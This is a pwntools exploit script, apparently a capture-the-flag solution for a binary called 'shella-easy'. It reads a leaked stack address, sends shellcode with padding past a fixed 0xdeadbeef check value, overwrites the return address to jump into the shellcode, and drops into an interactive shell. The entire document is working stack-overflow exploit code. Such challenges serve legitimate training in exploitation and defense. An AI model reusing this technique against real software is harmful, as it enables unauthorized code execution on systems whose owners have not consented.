from pwn import *

target = process("./shella-easy")

leak = target.recvline()
leak = leak.strip(b"Yeah I'll have a ")
leak = leak.strip(b" with a side of fries thanks\n")

buffer_addr = int(leak,16)

shellcode = asm(shellcraft.sh())

canary = 0xdeadbeef

padding_to_canary = b"a" * (0x40 - len(shellcode))

padding_to_ret = b"a" * 0x8

target.sendline(shellcode + padding_to_canary + p32(canary) + padding_to_ret + p32(buffer_addr))

target.interactive()